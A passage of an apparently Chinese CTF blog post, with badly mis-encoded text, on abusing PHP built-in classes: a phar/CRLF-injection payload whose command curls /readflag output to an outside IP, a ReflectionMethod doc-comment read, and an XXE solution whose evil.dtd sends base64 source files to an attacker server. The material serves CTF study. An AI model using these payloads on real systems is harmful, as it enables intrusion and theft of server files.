&#125;&#125;$target = &#39;http://127.0.0.1/admin.php&#39;;$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,);$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering(); //å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //è®¾ç½®stub$o = new File($f);$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>è¯¦ç»†è¿‡ç¨‹å¯æŸ¥çœ‹:<a href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> ã€Šwebåˆ·é¢˜ã€‹</p><h1 id="åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•"><a href="#åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•" class="headerlink" title="åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•"></a>åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•</h1><h2 id="ReflectionMethodç±»"><a href="#ReflectionMethodç±»" class="headerlink" title="ReflectionMethodç±»"></a>ReflectionMethodç±»</h2><p>ReflectionMethodçš„ç±»æŠ¥å‘Šäº†æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯<br>ç‰ˆæœ¬ï¼š(PHP 5, PHP 7, PHP 8)</p><h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // è·å–ä¸€çº§å±æ€§, å¯ä»¥ä¼ å‚æ•°è¿‡æ»¤, è¿”å›ReflectionProperty å¯¹è±¡çš„æ•°ç»„ã€‚var_dump($ref-&gt;getConstructor()); // è·å–æ„é€ å‡½æ•°, æœªå®šä¹‰è¿”å›nullvar_dump($ref-&gt;inNamespace()); // æ˜¯å¦åœ¨å‘½åç©ºé—´ä¸­var_dump($ref-&gt;getConstants()); // è·å–æ‰€æœ‰å®šä¹‰çš„å¸¸é‡var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // è·å–æŸä¸ªå¸¸é‡print_r($ref-&gt;getDefaultProperties()); // è·å–é»˜è®¤å±æ€§, è¿”å›æ•°ç»„, åŒ…æ‹¬çˆ¶ç±»çš„å±æ€§var_dump($ref-&gt;getDocComment()); // è·å–ç±»æ–‡æ¡£æ³¨é‡Š, ä¸åŒ…å«å±æ€§å’Œæ–¹æ³•çš„æ³¨é‡Š, æ— æ³¨é‡Šè¿”å›falsevar_dump($ref-&gt;getExtension()); // è·å–è·å–æœ€åä¸€è¡Œçš„è¡Œæ•°var_dump($ref-&gt;getFileName()); // è·å–å®šä¹‰ç±»çš„æ–‡ä»¶å, è¿”å›ç»å¯¹è·¯å¾„var_dump($ref-&gt;getInterfaceNames()); // è·å–æ¥å£åç§°, è¿”å›ç´¢å¼•æ•°ç»„,å€¼ä¸ºæ¥å£åç§°, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getInterfaces()); // è·å–æ¥å£, è¿”å›å…³è”æ•°ç»„, name=&gt;ReflectionClasså®ä¾‹, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getMethods()); // æŒ‡è·å–ç±»æ–¹æ³• ReflectionMethodã€‚var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // è·å–ä¸€ä¸ªç±»æ–¹æ³•çš„ ReflectionMethodã€‚å¦‚æœæ–¹æ³•ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€è¦é…åˆtry catchä¸€èµ·ç”¨var_dump($ref-&gt;getName()); // è·å–ç±»å, åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getNamespaceName()); // è·å–å‘½åç©ºé—´çš„åç§°, æ²¡æœ‰è¿”å›ç©ºvar_dump($ref-&gt;getParentClass()); // è·å–çˆ¶ç±»reflectionClassçš„å®ä¾‹, æ²¡æœ‰çˆ¶ç±»è¿”å›falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // è·å–ä¸€ä¸ªå±æ€§, è¿”å›ReflectionPropertyå®ä¾‹, å±æ€§ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€é…åˆtry catchä½¿ç”¨var_dump($ref-&gt;getShortName()); // è·å–ç±»å, ä¸åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getStartLine()); // è·å–èµ·å§‹è¡Œå·print_r($ref-&gt;getStaticProperties()); // è·å–é™æ€å±æ€§print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // è·å–é™æ€å±æ€§å€¼, æœªå®šä¹‰çš„å±æ€§ä¼šæŠ¥è‡´å‘½é”™è¯¯print_r($ref-&gt;getTraitAliases()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraitNames()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraits()); // è¿”å›è¿™ä¸ªç±»æ‰€ä½¿ç”¨çš„ traits æ•°ç»„var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // æ£€æŸ¥å¸¸é‡æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // æ£€æŸ¥æ–¹æ³•æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // æ£€æŸ¥å±æ€§æ˜¯å¦å·²å®šä¹‰var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // æ£€æŸ¥æ˜¯å¦å®ç°äº†æŸä¸ªæ¥å£, æ³¨æ„éœ€è¦å¸¦ä¸Šå‘½åç©ºé—´var_dump($ref-&gt;isAbstract()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯æŠ½è±¡ç±»ï¼ˆabstractï¼‰var_dump($ref-&gt;isAnonymous()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯åŒ¿åç±»var_dump($ref-&gt;isCloneable()); // è¿”å›äº†ä¸€ä¸ªç±»æ˜¯å¦å¯å¤åˆ¶var_dump($ref-&gt;isFinal()); // æ£€æŸ¥ç±»æ˜¯å¦å£°æ˜ä¸º finalvar_dump($ref-&gt;isInstance($obj)); // æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ­¤ç±»çš„å®ä¾‹var_dump($ref-&gt;isInstantiable()); // æ£€æŸ¥ç±»æ˜¯å¦å¯å®ä¾‹åŒ–var_dump($ref-&gt;isInterface()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯ä¸€ä¸ªæ¥å£ï¼ˆinterfaceï¼‰var_dump($ref-&gt;isInternal()); // æ£€æŸ¥ç±»æ˜¯å¦ç”±æ‰©å±•æˆ–æ ¸å¿ƒåœ¨å†…éƒ¨å®šä¹‰, å’ŒisUserDefinedç›¸å¯¹var_dump($ref-&gt;isIterateable()); // æ£€æŸ¥æ­¤ç±»æ˜¯å¦å¯è¿­ä»£, å®ç°äº†Iteratoræ¥å£å³å¯è¿­ä»£var_dump($ref-&gt;isSubclassOf(A::class)); // æ˜¯å¦æ˜¯æŸä¸€ä¸ªç±»çš„å­ç±»var_dump($ref-&gt;isTrait()); // è¿”å›äº†æ˜¯å¦ä¸ºä¸€ä¸ª traitvar_dump($ref-&gt;isUserDefined()); // æ£€æŸ¥æ˜¯å¦ç”±ç”¨æˆ·å®šä¹‰çš„ç±» å’ŒisInternalç›¸å¯¹// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚// æ¥å—å¯å˜æ•°ç›®çš„å‚æ•°ï¼Œç”¨äºä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ï¼Œå’Œ call_user_func() å¾ˆç›¸ä¼¼ã€‚var_dump($ref-&gt;newInstance());// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚//è¿™ä¸ªå‚æ•°ä»¥ array å½¢å¼ä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹è€Œä¸è°ƒç”¨ä»–çš„æ„é€ å‡½æ•°$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // è®¾ç½®é™æ€å±æ€§çš„å€¼, æ— è¿”å›å€¼var_dump($ref-&gt;__toString ()); // è¿”å› ReflectionClass å¯¹è±¡å­—ç¬¦ä¸²çš„è¡¨ç¤ºå½¢å¼ã€‚</code></pre><pre><code>### ReflectionMethod API```php/*ReflectionMethod::__construct â€” ReflectionMethod çš„æ„é€ å‡½æ•°ReflectionMethod::export â€” è¾“å‡ºä¸€ä¸ªå›è°ƒæ–¹æ³•ReflectionMethod::getClosure â€” è¿”å›ä¸€ä¸ªåŠ¨æ€å»ºç«‹çš„æ–¹æ³•è°ƒç”¨æ¥å£ï¼Œè¯‘è€…æ³¨ï¼šå¯ä»¥ä½¿ç”¨è¿™ä¸ªè¿”å›å€¼ç›´æ¥è°ƒç”¨éå…¬å¼€æ–¹æ³•ã€‚ReflectionMethod::getDeclaringClass â€” è·å–è¢«åå°„çš„æ–¹æ³•æ‰€åœ¨ç±»çš„åå°„å®ä¾‹ReflectionMethod::getModifiers â€” è·å–æ–¹æ³•çš„ä¿®é¥°ç¬¦ReflectionMethod::getPrototype â€” è¿”å›æ–¹æ³•åŸå‹ (å¦‚æœå­˜åœ¨)ReflectionMethod::invoke â€” InvokeReflectionMethod::invokeArgs â€” å¸¦å‚æ•°æ‰§è¡ŒReflectionMethod::isAbstract â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æŠ½è±¡æ–¹æ³•ReflectionMethod::isConstructor â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æ„é€ æ–¹æ³•ReflectionMethod::isDestructor â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ææ„æ–¹æ³•ReflectionMethod::isFinal â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦å®šä¹‰ finalReflectionMethod::isPrivate â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ç§æœ‰æ–¹æ³•ReflectionMethod::isProtected â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ä¿æŠ¤æ–¹æ³• (protected)ReflectionMethod::isPublic â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯å…¬å¼€æ–¹æ³•ReflectionMethod::isStatic â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯é™æ€æ–¹æ³•ReflectionMethod::setAccessible â€” è®¾ç½®æ–¹æ³•æ˜¯å¦è®¿é—®ReflectionMethod::__toString â€” è¿”å›åå°„æ–¹æ³•å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾*/ReflectionMethod extends ReflectionFunctionAbstract implements Reflector &#123;/* å¸¸é‡ */const integer IS_STATIC = 1 ;const integer IS_PUBLIC = 256 ;const integer IS_PROTECTED = 512 ;const integer IS_PRIVATE = 1024 ;const integer IS_ABSTRACT = 2 ;const integer IS_FINAL = 4 ;/* å±æ€§ */public $name ;public $class ;/* æ–¹æ³• */public __construct ( mixed $class , string $name )public static export ( string $class , string $name [, bool $return = false ] ) : stringpublic getClosure ( object $object ) : Closurepublic getDeclaringClass ( ) : ReflectionClasspublic getModifiers ( ) : intpublic getPrototype ( ) : ReflectionMethodpublic invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixedpublic invokeArgs ( object $object , array $args ) : mixedpublic isAbstract ( ) : boolpublic isConstructor ( ) : boolpublic isDestructor ( ) : boolpublic isFinal ( ) : boolpublic isPrivate ( ) : boolpublic isProtected ( ) : boolpublic isPublic ( ) : boolpublic isStatic ( ) : boolpublic setAccessible ( bool $accessible ) : voidpublic __toString ( ) : string/* ç»§æ‰¿çš„æ–¹æ³• */final private ReflectionFunctionAbstract::__clone ( ) : voidpublic ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClasspublic ReflectionFunctionAbstract::getClosureThis ( ) : objectpublic ReflectionFunctionAbstract::getDocComment ( ) : stringpublic ReflectionFunctionAbstract::getEndLine ( ) : intpublic ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtensionpublic ReflectionFunctionAbstract::getExtensionName ( ) : stringpublic ReflectionFunctionAbstract::getFileName ( ) : stringpublic ReflectionFunctionAbstract::getName ( ) : stringpublic ReflectionFunctionAbstract::getNamespaceName ( ) : stringpublic ReflectionFunctionAbstract::getNumberOfParameters ( ) : intpublic ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : intpublic ReflectionFunctionAbstract::getParameters ( ) : arraypublic ReflectionFunctionAbstract::getReturnType ( ) : ReflectionTypepublic ReflectionFunctionAbstract::getShortName ( ) : stringpublic ReflectionFunctionAbstract::getStartLine ( ) : intpublic ReflectionFunctionAbstract::getStaticVariables ( ) : arraypublic ReflectionFunctionAbstract::hasReturnType ( ) : boolpublic ReflectionFunctionAbstract::inNamespace ( ) : boolpublic ReflectionFunctionAbstract::isClosure ( ) : boolpublic ReflectionFunctionAbstract::isDeprecated ( ) : boolpublic ReflectionFunctionAbstract::isGenerator ( ) : boolpublic ReflectionFunctionAbstract::isInternal ( ) : boolpublic ReflectionFunctionAbstract::isUserDefined ( ) : boolpublic ReflectionFunctionAbstract::isVariadic ( ) : boolpublic ReflectionFunctionAbstract::returnsReference ( ) : boolabstract public ReflectionFunctionAbstract::__toString ( ) : void&#125;</code></pre><h2 id="ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›-easy-resource"><a href="#ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›-easy-resource" class="headerlink" title="[ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›]easy_resource"></a>[ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›]easy_resource</h2><p><strong>ç›®å½•æ‰«æå¯è·å¾—æºç :</strong></p><pre><code class="php">&lt;?phpclass User&#123;    private static $c = 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>å¯åˆ©ç”¨åŸç”Ÿçš„åå°„ç±»è¿›è¡Œè¯»å–ï¼Œé¢˜ç›®è¯´åœ¨çœ‹ä¸åˆ°çš„åœ°æ–¹ï¼ŒçŒœæµ‹æ˜¯åœ¨æ³¨é‡Šçš„åœ°æ–¹<br>å¯æ„é€ payload:</p><pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></pre><p>ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯:</p><pre><code class="php">$method = new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment); //getDocCommentè·å–æ–‡æ¡£æ³¨é‡Š</code></pre><p>ç”±äºä¸çŸ¥é“æ˜¯åœ¨å“ªä¸ªæ–¹æ³•å†…ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œéå†<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="img"></p><h1 id="ä½¿ç”¨-SimpleXMLElement-ç±»è¿›è¡Œ-XXE"><a href="#ä½¿ç”¨-SimpleXMLElement-ç±»è¿›è¡Œ-XXE" class="headerlink" title="ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE"></a>ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE</h1><p> SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»ç”¨äºè§£æ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚  </p><h2 id="SimpleXMLElement-ç±»"><a href="#SimpleXMLElement-ç±»" class="headerlink" title="SimpleXMLElement ç±»"></a>SimpleXMLElement ç±»</h2><p> å®˜æ–¹æ–‡æ¡£ä¸­å¯¹äºSimpleXMLElement ç±»çš„æ„é€ æ–¹æ³• SimpleXMLElement::__construct çš„å®šä¹‰å¦‚ä¸‹ï¼š<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="img"><br>å¯ä»¥çœ‹åˆ°é€šè¿‡è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° data_is_url ä¸º trueï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º2å³å¯ã€‚ç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„urlã€‚<br>è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥é€šè¿‡ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚</p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·å‘ç°å¦‚ä¸‹æºç <br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="img"></p><pre><code class="php">&lt;?php class calc&#123;    function __construct__()&#123;        calc();    &#125;    function calc($args1,$method,$args2)&#123;        $args1=intval($args1);        $args2=intval($args2);        switch ($method) &#123;            case &#39;a&#39;:                $method=&quot;+&quot;;                break;            case &#39;b&#39;:                $method=&quot;-&quot;;                break;            case &#39;c&#39;:                $method=&quot;*&quot;;                break;            case &#39;d&#39;:                $method=&quot;/&quot;;                break;                        default:                die(&quot;invalid input&quot;);        &#125;        $Expression=$args1.$method.$args2;        eval(&quot;\$r=$Expression;&quot;);        die(&quot;Calculation results:&quot;.$r);    &#125;&#125;?&gt;        </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="img"><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨SimpleXMLElementç±»<br>æˆ‘ä»¬æ„é€ çš„xmlå¦‚ä¸‹:<br>test.xml</p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>evil.dtd</p><pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>åœ¨vpsä¸Šæ”¾ä¸Šè¿™ä¸¤ä¸ªæ–‡ä»¶<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="img"><br>ç„¶åå†ä½¿ç”¨vpsç›‘å¬5555ç«¯å£<br>æœ€ç»ˆæ„é€ payload</p><pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¥å—åˆ°äº†æ•°æ®ï¼Œbase64è§£ç å³å¯<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="img"><br>åŒç†å¯è·å¾—å…¶ä»–é¡µé¢æºç </p><h1 id="ä½¿ç”¨-ZipArchive-ç±»æ¥åˆ é™¤æ–‡ä»¶"><a href="#ä½¿ç”¨-ZipArchive-ç±»æ¥åˆ é™¤æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶"></a>ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶</h1><h2 id="ZipArchive-ç±»"><a href="#ZipArchive-ç±»" class="headerlink" title="ZipArchive ç±»"></a>ZipArchive ç±»</h2><p>PHP ZipArchiveç±»æ˜¯PHPçš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ˜¯åœ¨PHP 5.20ä¹‹åå¼•å…¥çš„ã€‚ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†ã€‚<br>ä¸‹é¢åˆ—ä¸¾å‡ ä¸ªå¸¸è§çš„ç±»æ–¹æ³•ï¼š</p><ul><li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>ï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>ï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»</li><li><a href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>ï¼šå…³é—­ziparchive</li><li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>ï¼šå°†å‹ç¼©åŒ…è§£å‹</li><li><a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>ï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…</li><li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼šdeleteIndex(0)ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶</li><li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤</li><li>â€¦â€¦</li></ul><p>æˆ‘ä»¬æ¥é‡ç‚¹çœ‹çœ‹ ZipArchive::open æ–¹æ³•ï¼š</p><pre><code class="php">ZipArchive::open(string $filename, int $flags=0)</code></pre><p>è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£ä»¥è¿›è¡Œè¯»å–ï¼Œå†™å…¥æˆ–ä¿®æ”¹ã€‚</p><ul><li>filenameï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚</li><li>flagsï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼š <ul><li>ZipArchive::OVERWRITEï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚</li><li>ZipArchive::CREATEï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</li><li>ZipArchive::RDONLYï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚</li><li>ZipArchive::EXCLï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</li><li>ZipArchive::CHECKCONSï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul></li></ul><p>æ³¨æ„ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE = 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º8ã€‚<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ZipArchiveåŸç”Ÿç±»è°ƒç”¨openæ–¹æ³•åˆ é™¤ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€é“CTFé¢˜ç›®ã€‚</p><h2 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h2><p>æºç ä¸‹è½½:<a 